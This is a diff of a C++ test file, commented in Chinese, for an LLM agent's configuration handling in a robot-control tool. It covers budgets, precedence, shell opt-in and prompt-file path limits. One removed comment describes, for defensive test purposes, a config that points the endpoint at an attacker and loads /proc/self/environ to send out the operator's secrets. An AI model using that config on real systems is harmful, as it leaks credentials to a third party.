@@ -11,6 +11,7 @@
 
 #include "actionsource.hpp"
 #include "agentmode.hpp"
+#include "agentprompt.hpp"	/* quoteUntrusted（disk_content 用例直接调用；IWYU） */
 #include "llmconfig.hpp"
 #include "robot.hpp"
 #include "util.hpp"
@@ -185,83 +186,6 @@ TH_TEST(llmconfig_runtime_fields_parse_and_reject) {
 	LlmFileConfig o3;
 	std::string e3;
 	TH_CHECK_MSG(loadLlmConfigFile(st.string(), o3, e3), e3);
-}
-
-/* ================= A4：单任务墙钟预算的配置面 =================
- * 三个层次的优先级与 timeout 同款（命令行 > 配置文件 > 内建缺省），
- * 区间取自 llm_limits 单点；0 是**合法值**（= 不限，逃生口），
- * 所以它的下界与 timeout 的下界（1）不同。 */
-TH_TEST(agentconfig_task_budget_layers_and_range) {
-	NoKeyEnv nokey;
-	/* 密钥解析（buildAgentConfig 第 4 步）先于采样层（第 5 步）：没有密钥就
-	 * 走不到 max_task_seconds 的校验，报错会是「缺少 API key」而不是越界。 */
-	EnvVar key{"BOT4CJ_LLM_KEY", "test-key"};
-	TempDir tmp("tasksec");
-
-	/* 1) 什么都不给 → 内建缺省 900 */
-	{
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(buildAgentConfig(baseOptions("none"), out, err));
-		TH_CHECK_MSG(out.maxTaskSeconds == 900,
-			"缺省应为 900 秒，实际 " + std::to_string(out.maxTaskSeconds));
-	}
-	/* 2) 配置文件生效；0 合法（= 不限） */
-	{
-		fs::path cfg = tmp.path() / "a.json";
-		writeFile(cfg, R"({"api_key":"k","max_task_seconds":60})", fs::perms::owner_all);
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), out, err));
-		TH_CHECK_MSG(out.maxTaskSeconds == 60, "实际 " + std::to_string(out.maxTaskSeconds));
-
-		fs::path zero = tmp.path() / "z.json";
-		writeFile(zero, R"({"api_key":"k","max_task_seconds":0})", fs::perms::owner_all);
-		AgentModeConfig outZero;
-		TH_CHECK_MSG(buildAgentConfig(baseOptions(zero.string()), outZero, err), err);
-		TH_CHECK_MSG(outZero.maxTaskSeconds == 0, "0 应被接受（= 不限），实际 "
-			+ std::to_string(outZero.maxTaskSeconds));
-	}
-	/* 3) 命令行覆盖配置文件 */
-	{
-		fs::path cfg = tmp.path() / "b.json";
-		writeFile(cfg, R"({"api_key":"k","max_task_seconds":60})", fs::perms::owner_all);
-		CliOptions o = baseOptions(cfg.string());
-		o.llmTaskTimeout = "77";
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(buildAgentConfig(o, out, err));
-		TH_CHECK_MSG(out.maxTaskSeconds == 77, "命令行应覆盖配置文件，实际 "
-			+ std::to_string(out.maxTaskSeconds));
-	}
-	/* 4) 配置文件越界 → 人话报错（点名文件与字段） */
-	{
-		fs::path cfg = tmp.path() / "bad.json";
-		writeFile(cfg, R"({"api_key":"k","max_task_seconds":86401})", fs::perms::owner_all);
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(!buildAgentConfig(baseOptions(cfg.string()), out, err));
-		TH_CHECK_MSG(err.find("max_task_seconds") != std::string::npos,
-			"报错应点名越界字段: " + err);
-		TH_CHECK_MSG(err.find("86401") != std::string::npos, "报错应给出实测值: " + err);
-	}
-	/* 5) 命令行越界 / 非数字 → 报错点名选项名 */
-	{
-		CliOptions o = baseOptions("none");
-		o.llmTaskTimeout = "-5";
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(!buildAgentConfig(o, out, err));
-		TH_CHECK_MSG(err.find("--llm-task-timeout") != std::string::npos,
-			"报错应点名选项: " + err);
-
-		CliOptions o2 = baseOptions("none");
-		o2.llmTaskTimeout = "abc";
-		AgentModeConfig out2;
-		std::string err2;
-		TH_CHECK(!buildAgentConfig(o2, out2, err2));
-		TH_CHECK_MSG(err2.find("需要一个整数") != std::string::npos, "实际: " + err2);
-	}
 }
 
 /* ================= H1：capture_image 白名单根的配置面 =================
@@ -494,46 +418,14 @@ TH_TEST(llmconfig_permission_warning) {
 
 /* ================= buildAgentConfig：优先级与合并 ================= */
 
-TH_TEST(agentconfig_reads_url_key_model_from_file) {
-	NoKeyEnv nokey;
-	TempDir tmp("merge");
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({
-	  "driver": "LlmDeepSeek", "var": "brain",
-	  "endpoint": "https://example.invalid/v1", "model": "cfg-model",
-	  "api_key": "cfg-key", "timeout": 33, "max_tokens": 777,
-	  "temperature": 0.2, "top_p": 0.6, "max_turns": 9,
-	  "scripts_dir": "scripts/test", "allow_shell": false,
-	  "reasoning_effort": "high", "thinking": "enabled"
-	})", fs::perms::owner_all);
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), out, err));
-	TH_CHECK(err.empty());
-	TH_CHECK(out.configPath == cfg.string());
-	TH_CHECK(out.driverTable == "LlmDeepSeek");
-	TH_CHECK(out.llmVar == "brain");
-	TH_CHECK(out.endpoint == "https://example.invalid/v1");
-	TH_CHECK(out.model == "cfg-model");
-	TH_CHECK(out.resolvedApiKey == "cfg-key");
-	TH_CHECK(out.timeoutSec == 33);
-	TH_CHECK(out.maxTokens == 777);
-	TH_CHECK(out.temperature == 0.2);
-	TH_CHECK(out.topP == 0.6);
-	TH_CHECK(out.maxTurns == 9);
-	TH_CHECK(out.scriptsDir == "scripts/test");
-	TH_CHECK(!out.allowShell);
-	TH_CHECK(out.reasoningEffort == "high");
-	TH_CHECK(out.thinking == "enabled");
-}
-
+/* 上下文字节预算从配置文件搬进 AgentModeConfig（applyContextBudgets）。后端不消费
+ * 这三个值（实际预算由 Rust agent 强制），搬运只为 --check-config 摘要摆出来供
+ * agent_e2e.sh R5m 双端互钉；0 = 不限是合法值。 */
 TH_TEST(agentconfig_reads_budget_fields_from_file) {
 	NoKeyEnv nokey;
 	TempDir tmp("budget-merge");
 	fs::path cfg = tmp.path() / "llm.json";
 	writeFile(cfg, R"({
-	  "api_key": "k",
 	  "max_history_bytes": 8388608,
 	  "max_task_tool_result_bytes": 0,
 	  "max_task_image_bytes": 6291456
@@ -547,43 +439,6 @@ TH_TEST(agentconfig_reads_budget_fields_from_file) {
 	TH_CHECK(out.maxHistoryBytes == 8388608);
 	TH_CHECK(out.maxTaskToolResultBytes == 0);
 	TH_CHECK(out.maxTaskImageBytes == 6291456);
-}
-
-TH_TEST(agentconfig_runtime_fields_reach_config_and_driver) {
-	NoKeyEnv nokey;
-	TempDir tmp("runtime-merge");
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({
-	  "api_key": "k",
-	  "max_calls_per_round": 4,
-	  "max_retries": 0,
-	  "retry_backoff_ms": 250,
-	  "run_command_timeout_sec": 20,
-	  "run_command_max_timeout_sec": 90
-	})", fs::perms::owner_all);
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK_MSG(buildAgentConfig(baseOptions(cfg.string()), out, err), err);
-	TH_CHECK(out.maxCallsPerRound == 4);
-	/* 0 必须能穿过「未配置」判定：optional 的 has_value 语义，写错成 `if (*opt)`
-	 * 会让 max_retries=0 静默退回缺省 3 */
-	TH_CHECK(out.maxRetries == 0);
-	TH_CHECK(out.retryBackoffMs == 250);
-	TH_CHECK(out.commandTimeoutSec == 20);
-	TH_CHECK(out.maxCommandTimeoutSec == 90);
-	/* 未配置 = 现状缺省（行为保持的另一半） */
-	TempDir t2("runtime-default");
-	fs::path cfg2 = t2.path() / "llm.json";
-	writeFile(cfg2, R"({"api_key":"k"})", fs::perms::owner_all);
-	AgentModeConfig out2;
-	std::string err2;
-	TH_CHECK(buildAgentConfig(baseOptions(cfg2.string()), out2, err2));
-	TH_CHECK(out2.maxCallsPerRound == 16);
-	TH_CHECK(out2.maxRetries == 3);
-	TH_CHECK(out2.retryBackoffMs == 1000);
-	TH_CHECK(out2.commandTimeoutSec == 10);
-	TH_CHECK(out2.maxCommandTimeoutSec == 60);
 }
 
 TH_TEST(agentconfig_backend_tool_budgets_reach_execution_context) {
@@ -608,7 +463,6 @@ TH_TEST(agentconfig_backend_tool_budgets_reach_execution_context) {
 		TH_CHECK(ctx.commandTimeoutSec == 3);
 		TH_CHECK(ctx.maxCommandTimeoutSec == 5);
 		TH_CHECK(ctx.scriptTimeoutSec == scriptSeconds);
-		TH_CHECK(out.resolvedApiKey.empty());
 	}
 }
 
@@ -672,153 +526,27 @@ TH_TEST(agentconfig_run_command_timeout_cap_below_default_is_rejected) {
 	TH_CHECK(out2.maxCommandTimeoutSec == 5);
 }
 
-TH_TEST(agentconfig_cli_overrides_file) {
-	NoKeyEnv nokey;
-	TempDir tmp("cli");
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({
-	  "endpoint": "https://from-file/v1", "model": "file-model",
-	  "api_key": "file-key", "max_turns": 9, "scripts_dir": "file-scripts"
-	})", fs::perms::owner_all);
-
-	CliOptions o = baseOptions(cfg.string());
-	o.llmEndpoint = "https://from-cli/v1";
-	o.llmModel = "cli-model";
-	o.llmMaxTurns = "3";
-	o.scriptsDir = "cli-scripts";
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(buildAgentConfig(o, out, err));
-	TH_CHECK(out.endpoint == "https://from-cli/v1");
-	TH_CHECK(out.model == "cli-model");
-	/* 密钥不经命令行（--llm-key 已移除），本次仍来自配置文件 */
-	TH_CHECK(out.resolvedApiKey == "file-key");
-	TH_CHECK(out.maxTurns == 3);
-	TH_CHECK(out.scriptsDir == "cli-scripts");
-}
-
-TH_TEST(agentconfig_env_overrides_file_but_loses_to_cli) {
-	NoKeyEnv nokey;
-	TempDir tmp("env");
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({
-	  "endpoint": "https://from-file/v1", "model": "file-model", "api_key": "file-key"
-	})", fs::perms::owner_all);
-
-	EnvVar envEndpoint{"BOT4CJ_LLM_ENDPOINT", "https://from-env/v1"};
-	EnvVar envModel{"BOT4CJ_LLM_MODEL", "env-model"};
-	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), out, err));
-	TH_CHECK(out.endpoint == "https://from-env/v1");
-	TH_CHECK(out.model == "env-model");
-	TH_CHECK(out.resolvedApiKey == "env-key");
-
-	/* 命令行仍然压过环境变量 */
-	CliOptions o = baseOptions(cfg.string());
-	o.llmEndpoint = "https://from-cli/v1";
-	AgentModeConfig out2;
-	TH_CHECK(buildAgentConfig(o, out2, err));
-	TH_CHECK(out2.endpoint == "https://from-cli/v1");
-}
-
-TH_TEST(agentconfig_key_from_file_api_key_file) {
-	NoKeyEnv nokey;
-	TempDir tmp("keyfile2");
-	fs::path key = tmp.path() / "k.key";
-	writeFile(key, "sk-loose\n", fs::perms::owner_all | fs::perms::others_read);
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, std::string("{\"api_key_file\":\"") + key.string() + "\"}",
-		fs::perms::owner_all);
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), out, err));
-	TH_CHECK(out.resolvedApiKey == "sk-loose");
-	/* 密钥文件权限过松要提醒，但只是提醒、不阻断 */
-	TH_CHECK(!out.configWarning.empty());
-	TH_CHECK(out.configWarning.find("chmod 600") != std::string::npos);
-}
-
-/* ================= shellKeyExposureWarning：密钥对 agent 的 shell 是否可见 =================
- * run_command 的子进程与宿主同用户，只有「环境变量」这一来源是安全的
- * （buildCleanEnvp 会剔除含 key/token 等关键词的变量）；文件与命令行都能被直接读走。 */
-
-TH_TEST(agentconfig_key_source_is_recorded_and_flagged) {
-	NoKeyEnv nokey;
-	TempDir tmp("keysrc");
-
-	/* 环境变量来源 → 不告警 */
-	{
-		EnvVar envKey{"BOT4CJ_LLM_KEY", "env-secret-value"};
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(buildAgentConfig(baseOptions("none"), out, err));
-		TH_CHECK(out.apiKeySource == ApiKeySource::Env);
-		TH_CHECK(shellKeyExposureWarning(out).empty());
-	}
-	/* 配置文件内联 api_key → 告警（文件可读）；allowShell 需显式开启才有该告警 */
-	{
-		fs::path cfg = tmp.path() / "inline.json";
-		writeFile(cfg, R"({"api_key":"inline-secret-value"})", fs::perms::owner_all);
-		CliOptions o = baseOptions(cfg.string());
-		o.agentShell = true;
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(buildAgentConfig(o, out, err));
-		TH_CHECK(out.apiKeySource == ApiKeySource::ConfigInline);
-		std::string w = shellKeyExposureWarning(out);
-		TH_CHECK(w.find("api_key") != std::string::npos);
-		/* 告警只讲来源，绝不复述密钥本身 */
-		TH_CHECK(w.find("inline-secret-value") == std::string::npos);
-	}
-	/* 密钥文件 → 告警（该文件可读）；本组用例的 allowShell 由下一行的显式开启提供 */
-	{
-		fs::path key = tmp.path() / "k.key";
-		writeFile(key, "file-secret-value\n", fs::perms::owner_all);
-		fs::path cfg = tmp.path() / "keyfile.json";
-		writeFile(cfg, std::string("{\"api_key_file\":\"") + key.string() + "\"}",
-			fs::perms::owner_all);
-		CliOptions o = baseOptions(cfg.string());
-		o.agentShell = true;		/* run_command 现为显式开启 */
-		AgentModeConfig out;
-		std::string err;
-		TH_CHECK(buildAgentConfig(o, out, err));
-		TH_CHECK(out.apiKeySource == ApiKeySource::ConfigFile);
-		TH_CHECK(!shellKeyExposureWarning(out).empty());
-	}
-}
-
 /* 安全缺省翻转（2026-09-20 评估 C12）+ 审计 4.1 收紧：run_command 缺省**不注册**，
  * 且开启是**命令行独占**的显式选择（--agent-shell）；配置文件的 allow_shell
- * 只能关不能开，写 true 直接拒绝加载。这既让「密钥对 agent 的 shell 可见」
- * 这条告警默认不适用，也让"一个落地配置文件就能开出主机 shell"不成立。 */
+ * 只能关不能开，写 true 直接拒绝加载——「一个落地配置文件就能开出主机 shell」不成立。 */
 TH_TEST(agentconfig_shell_is_off_by_default_and_on_by_explicit_flag) {
 	NoKeyEnv nokey;
 	TempDir tmp("shell");
 	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({"api_key":"inline-secret-value"})", fs::perms::owner_all);
+	writeFile(cfg, R"({})", fs::perms::owner_all);
 
-	/* 1) 缺省：不注册 run_command，告警静默 */
+	/* 1) 缺省：不注册 run_command */
 	AgentModeConfig out;
 	std::string err;
 	TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), out, err));
 	TH_CHECK(!out.allowShell);
-	TH_CHECK(shellKeyExposureWarning(out).empty());
 
-	/* 2) --agent-shell：注册 run_command；密钥来自配置文件 → 启动告警 */
+	/* 2) --agent-shell：注册 run_command */
 	CliOptions o = baseOptions(cfg.string());
 	o.agentShell = true;
 	AgentModeConfig out2;
 	TH_CHECK(buildAgentConfig(o, out2, err));
 	TH_CHECK(out2.allowShell);
-	std::string w = shellKeyExposureWarning(out2);
-	TH_CHECK(!w.empty());
-	/* 告警只讲来源，绝不复述密钥本身 */
-	TH_CHECK(w.find("inline-secret-value") == std::string::npos);
 
 	/* 3) 审计 4.1 收紧：配置文件**不能**开 shell（只能关）。
 	 * 缺省查找会读 CWD 的 ./mybot.llm.json，所以「配置能开」实际等于
@@ -826,8 +554,7 @@ TH_TEST(agentconfig_shell_is_off_by_default_and_on_by_explicit_flag) {
 	 * endpoint 把上下文外发——「文件存在」不构成授权。报错必须指名 allow_shell
 	 * 与 --agent-shell，否则用户只看到"配置加载失败"，不知道该删哪个字段。 */
 	fs::path cfg2 = tmp.path() / "shell.json";
-	writeFile(cfg2, R"({"api_key":"inline-secret-value","allow_shell":true})",
-		fs::perms::owner_all);
+	writeFile(cfg2, R"({"allow_shell":true})", fs::perms::owner_all);
 	AgentModeConfig out3;
 	std::string err3;
 	TH_CHECK(!buildAgentConfig(baseOptions(cfg2.string()), out3, err3));
@@ -960,18 +687,6 @@ TH_TEST(agentconfig_mcp_backend_requires_policy_for_dangerous_caps) {
 	}
 }
 
-TH_TEST(agentconfig_requires_key_from_somewhere) {
-	NoKeyEnv nokey;
-	TempDir tmp("nokey");
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({"endpoint":"https://example.invalid/v1"})", fs::perms::owner_all);
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(!buildAgentConfig(baseOptions(cfg.string()), out, err));
-	TH_CHECK(err.find("缺少 API key") != std::string::npos);
-}
-
 TH_TEST(agentconfig_missing_explicit_config_is_an_error) {
 	NoKeyEnv nokey;
 	AgentModeConfig out;
@@ -984,48 +699,39 @@ TH_TEST(agentconfig_missing_explicit_config_is_an_error) {
 TH_TEST(agentconfig_none_disables_config_lookup) {
 	/* 缺省查找会看 CWD 里的 ./mybot.llm.json；CI/守门与「换台机器跑同一条命令」
 	 * 都需要确定性，故必须有显式关闭开关（实测：开发者个人配置会悄悄改变测试
-	 * 结果——e2e 的「默认驱动」场景被 ./mybot.llm.json 换成了 DeepSeek 驱动）。 */
+	 * 结果）。证明「确实没读文件」的硬证据：文件里写后端**仍消费**的活字段
+	 * （scripts_dir / run_command_timeout_sec），none 时它们必须保持内置缺省。 */
 	TempDir tmp("none");
 	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({"api_key":"file-key","driver":"LlmDeepSeek"})", fs::perms::owner_all);
+	writeFile(cfg, R"({"scripts_dir":"from-file","run_command_timeout_sec":33})",
+		fs::perms::owner_all);
 
-	/* A) 关掉配置 + 不给任何环境变量：文件里的 key 必须读不到 → 判缺 key。
-	 *    这是「确实没读文件」最硬的证据（其余断言都会被执行顺序影响）。 */
+	/* A) 命令行 --llm-config=none：文件里的活字段一个都不该生效 */
 	{
-		NoKeyEnv nokey;
 		AgentModeConfig a;
 		std::string e;
-		TH_CHECK(!buildAgentConfig(baseOptions("none"), a, e));	/* 命令行 none */
-		TH_CHECK(e.find("缺少 API key") != std::string::npos);
-	}
-	/* B) 补上环境变量 key 后能建起来，且 driver 仍是内置缺省而非文件里的 LlmDeepSeek */
-	{
-		NoKeyEnv nokey;
-		EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
-		AgentModeConfig a;
-		std::string e;
-		TH_CHECK(buildAgentConfig(baseOptions("none"), a, e));
+		TH_CHECK_MSG(buildAgentConfig(baseOptions("none"), a, e), e);
 		TH_CHECK(a.configPath.empty());
-		TH_CHECK(a.resolvedApiKey == "env-key");
-		TH_CHECK(a.driverTable == "LlmOpenAI");
+		TH_CHECK(a.scriptsDir == "scripts");		/* 内置缺省，非 from-file */
+		TH_CHECK(a.commandTimeoutSec == 10);		/* 内置缺省，非 33 */
 	}
-	/* C) 环境变量 none 同样生效（此处不给 --llm-config，本该走缺省查找） */
+	/* B) 环境变量 BOT4CJ_LLM_CONFIG=none 同样生效（此处不给 --llm-config，
+	 *    本该走缺省查找读到 CWD 的 ./mybot.llm.json） */
 	{
-		NoKeyEnv nokey;
-		EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
 		EnvVar envCfg{"BOT4CJ_LLM_CONFIG", "none"};
 		AgentModeConfig a;
 		std::string e;
-		TH_CHECK(buildAgentConfig(baseOptions(""), a, e));
+		TH_CHECK_MSG(buildAgentConfig(baseOptions(""), a, e), e);
 		TH_CHECK(a.configPath.empty());
-		TH_CHECK(a.driverTable == "LlmOpenAI");
+		TH_CHECK(a.scriptsDir == "scripts");
+		TH_CHECK(a.commandTimeoutSec == 10);
 	}
 }
 
 TH_TEST(agentconfig_config_path_from_env) {
 	TempDir tmp("envcfg");
 	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({"api_key":"env-path-key","model":"m"})", fs::perms::owner_all);
+	writeFile(cfg, R"({"scripts_dir":"env-scripts"})", fs::perms::owner_all);
 
 	NoKeyEnv nokey;
 	EnvVar envCfg{"BOT4CJ_LLM_CONFIG", cfg.string().c_str()};
@@ -1035,16 +741,17 @@ TH_TEST(agentconfig_config_path_from_env) {
 	std::string err;
 	TH_CHECK(buildAgentConfig(o, out, err));
 	TH_CHECK(out.configPath == cfg.string());
-	TH_CHECK(out.resolvedApiKey == "env-path-key");
+	/* 活字段生效 = 文件确被读取（不只是记了个路径） */
+	TH_CHECK(out.scriptsDir == "env-scripts");
 
 	/* --llm-config 压过环境变量 */
 	TempDir tmp2("envcfg2");
 	fs::path cfg2 = tmp2.path() / "llm2.json";
-	writeFile(cfg2, R"({"api_key":"cli-path-key"})", fs::perms::owner_all);
+	writeFile(cfg2, R"({"scripts_dir":"cli-scripts"})", fs::perms::owner_all);
 	AgentModeConfig out2;
 	TH_CHECK(buildAgentConfig(baseOptions(cfg2.string()), out2, err));
 	TH_CHECK(out2.configPath == cfg2.string());
-	TH_CHECK(out2.resolvedApiKey == "cli-path-key");
+	TH_CHECK(out2.scriptsDir == "cli-scripts");
 }
 
 /* ================= 提示词包（--prompt-file / 配置文件 prompt_files） =================
@@ -1086,114 +793,6 @@ TH_TEST(llmconfig_prompt_files_parses_and_rejects_bad_shapes) {
 	TH_CHECK(!c4.promptFiles);
 }
 
-/* 目录写进配置文件 → buildAgentConfig 加载成成品文本，分节按自然排序。
- * H2（2026-09-23）：配置文件来源的提示词路径必须落在允许的根之内，夹具在
- * TempDir（CWD 之外），故须显式授予根——这也正是新逃生口 BOT4CJ_PROMPT_DIR 的用法。 */
-TH_TEST(agentconfig_prompt_pack_loaded_from_config_file) {
-	NoKeyEnv nokey;
-	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
-	TempDir tmp("ppcfg");
-	const std::string rootStr = tmp.path().string();
-	EnvVar promptDir{"BOT4CJ_PROMPT_DIR", rootStr.c_str()};
-	fs::path pack = tmp.path() / "pack";
-	/* 本文件的 writeFile 不建父目录，目录输入要先显式创建 */
-	fs::create_directories(pack);
-	writeFile(pack / "10-尾声.md", "按之前的方式操作\n", fs::perms::owner_all);
-	writeFile(pack / "1-身份.md", "你是蜘蛛机器人。\n", fs::perms::owner_all);
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, std::string("{\"prompt_files\":[\"") + pack.string() + "\"]}",
-		fs::perms::owner_all);
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), out, err));
-	TH_CHECK(out.promptFiles.size() == 1 && out.promptFiles[0] == pack.string());
-	size_t p1 = out.promptPack.find("## 1-身份.md");
-	size_t p10 = out.promptPack.find("## 10-尾声.md");
-	TH_CHECK(p1 != std::string::npos && p10 != std::string::npos);
-	TH_CHECK(p1 < p10);
-}
-
-/* 命令行给过 --prompt-file 就整体覆盖配置文件列表（与 pickString 同口径） */
-TH_TEST(agentconfig_prompt_pack_cli_overrides_config_file) {
-	NoKeyEnv nokey;
-	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
-	TempDir tmp("ppcli");
-	fs::path packDir = tmp.path() / "from-config";
-	fs::create_directories(packDir);	/* writeFile 不建父目录 */
-	writeFile(packDir / "cfg.md", "来自配置文件\n", fs::perms::owner_all);
-	fs::path cliFile = tmp.path() / "from-cli.md";
-	writeFile(cliFile, "来自命令行\n", fs::perms::owner_all);
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, std::string("{\"prompt_files\":[\"") + packDir.string() + "\"]}",
-		fs::perms::owner_all);
-
-	CliOptions o = baseOptions(cfg.string());
-	o.promptFiles.push_back(cliFile.string());
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(buildAgentConfig(o, out, err));
-	TH_CHECK(out.promptPack == "来自命令行");
-	TH_CHECK(out.promptFiles.size() == 1 && out.promptFiles[0] == cliFile.string());
-}
-
-/* 提示词路径写错在配置组装期失败——早于结构装载与上电（不碰真机） */
-TH_TEST(agentconfig_prompt_pack_bad_path_fails_at_config_time) {
-	NoKeyEnv nokey;
-	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
-	CliOptions o = baseOptions("none");
-	o.promptFiles.push_back("/nonexistent/prompts");
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(!buildAgentConfig(o, out, err));
-	TH_CHECK(err.find("不存在") != std::string::npos);
-}
-
-/* H2（2026-09-23）：**配置文件来源**的提示词路径必须落在工作目录（或
- * BOT4CJ_PROMPT_DIR 显式列的根）之内。动机：prompt_files 的内容会进系统提示词
- * 并随首个请求发往同一份配置可控的 endpoint，而读取走 read() 循环（不依赖
- * stat 长度）⇒ 一份落在 CWD 的 ./mybot.llm.json 写
- * `{"endpoint":"<攻击者>","prompt_files":["/proc/self/environ"]}` 就能把操作者的
- * 环境块（含密钥）整块外发。命令行 --prompt-file 是操作者本人授意，不受限。 */
-TH_TEST(agentconfig_prompt_files_from_config_must_be_within_allowed_roots) {
-	NoKeyEnv nokey;
-	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
-	EnvVar noPromptDir{"BOT4CJ_PROMPT_DIR", nullptr};	/* 起点确定：不受开发者环境干扰 */
-	TempDir tmp("ppscope");
-	fs::path pack = tmp.path() / "pack";
-	fs::create_directories(pack);
-	writeFile(pack / "a.md", "越界的提示词\n", fs::perms::owner_all);
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, std::string("{\"prompt_files\":[\"") + pack.string() + "\"]}",
-		fs::perms::owner_all);
-
-	/* ① 越界（TempDir 在 CWD 之外）且没有显式根 → 配置组装期拒绝，报错给出出路 */
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(!buildAgentConfig(baseOptions(cfg.string()), out, err));
-	TH_CHECK(err.find("根之外") != std::string::npos);
-	TH_CHECK(err.find(pack.string()) != std::string::npos);
-	TH_CHECK(err.find("--prompt-file") != std::string::npos);
-	TH_CHECK(err.find("BOT4CJ_PROMPT_DIR") != std::string::npos);
-
-	/* ② 同一份配置在显式授予根之后可用——逃生口只有启动者能设（配置文件写不了） */
-	const std::string rootStr = tmp.path().string();
-	EnvVar promptDir{"BOT4CJ_PROMPT_DIR", rootStr.c_str()};
-	AgentModeConfig ok;
-	std::string okErr;
-	TH_CHECK(buildAgentConfig(baseOptions(cfg.string()), ok, okErr));
-	TH_CHECK(okErr.empty());
-	TH_CHECK(ok.promptPack.find("越界的提示词") != std::string::npos);
-
-	/* ③ 不存在的条目仍报「不存在」——越界判据不抢加载期的报错（否则拼写错误
-	 * 会被报成越界，排查方向直接被带偏） */
-	writeFile(cfg, R"({"prompt_files":["/nonexistent/prompts"]})", fs::perms::owner_all);
-	AgentModeConfig out3;
-	std::string err3;
-	TH_CHECK(!buildAgentConfig(baseOptions(cfg.string()), out3, err3));
-	TH_CHECK(err3.find("不存在") != std::string::npos);
-}
-
 /* 回读清单只能命令行给（发现 2 的 A 步）：配置文件写 read_vars 一律拒绝加载，
  * 并**指名**正确的入口——与 allow_shell / camera_src_dir 同判据。 */
 TH_TEST(agentconfig_read_vars_from_config_is_rejected) {
@@ -1218,35 +817,6 @@ TH_TEST(agentconfig_read_vars_from_config_is_rejected) {
 	std::string err2;
 	TH_CHECK(!buildAgentConfig(o, out2, err2));
 	TH_CHECK(err2.find("read_vars") != std::string::npos);
-}
-
-/* C6：配置组装期的体积预检读出两段成品（structureHead/scriptsList）存进
- * 配置，供 MCP 后端的 context.get 复用（单一读法，避免「预检口径」与
- * 「提示词口径」两次读盘分叉）。 */
-TH_TEST(agentconfig_prompt_reuses_precheck_reads) {
-	NoKeyEnv nokey;
-	EnvVar envKey{"BOT4CJ_LLM_KEY", "env-key"};
-	TempDir tmp("promptcache");
-	fs::path sql = tmp.path() / "robot.sql";
-	writeFile(sql, "CREATE TABLE Timer (name String);\n-- 预检时的注释\n",
-		fs::perms::owner_all);
-	fs::path scripts = tmp.path() / "scripts";
-	fs::create_directories(scripts);
-	writeFile(scripts / "wave.mt", "-- 预检时的脚本\n", fs::perms::owner_all);
-
-	CliOptions o = baseOptions("none");
-	o.robot = sql.string();
-	o.scriptsDir = scripts.string();
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK(buildAgentConfig(o, out, err));
-	TH_CHECK(out.structureHead
-		&& out.structureHead->find("预检时的注释") != std::string::npos);
-	TH_CHECK(out.scriptsList && out.scriptsList->find("wave.mt") != std::string::npos);
-
-	/* 消费方（MCP 后端的 context.get）拿到的就是这两段成品（有缓存用缓存）；
-	 * 原先「系统提示词复用同一份」的断言随 buildAgentSystemPrompt 迁 Rust
-	 * （agent/src/prompt.rs 经 context.get 素材拼装，语义对齐）删除。 */
 }
 
 /* 审计 F：来自磁盘的内容（结构脚本正文 / 动作脚本首注释 / 硬件变量名）不得占用
@@ -1324,19 +894,20 @@ TH_TEST(llmconfig_api_key_control_chars_rejected) {
 
 /* ---- PL-1（2026-09-22）：--check-config 的摘要渲染 ----
  * summarizeAgentConfig **不做校验**（判据单点在 buildAgentConfig，失败时调用方
- * 已 return 2），所以这里只钉两件它必须做到的事：
- *   ① 合法配置下摘要点名操作者排障要看的字段；
- *   ② 密钥值**绝不出现**在摘要里（只报来源），以及
- *   ③ endpoint 为空时明写「未配置，首次调用将失败」——不联网也能把这句话摆出来，
- *      正是这个模式一半的价值所在。 */
+ * 已 return 2）。2026-09-26 起摘要只报 --mcp-backend 工具面真实生效的字段，
+ * 模型侧（endpoint/model/采样）由 mybot-agent --check-config 自行校验。这里钉
+ * 两件它必须做到的事：
+ *   ① 合法配置下摘要点名操作者排障要看的后端字段（结构/脚本目录/工具超时）；
+ *   ② 配置文件里的 api_key 值**绝不出现**在摘要里——后端已不持有密钥，但
+ *      「摘要不泄露配置中的秘密」仍是硬回归守卫（摘要会进终端与 CI 日志）。 */
 TH_TEST(agentconfig_summary_reports_config_without_leaking_key) {
 	NoKeyEnv nokey;
 	TempDir tmp("check-config");
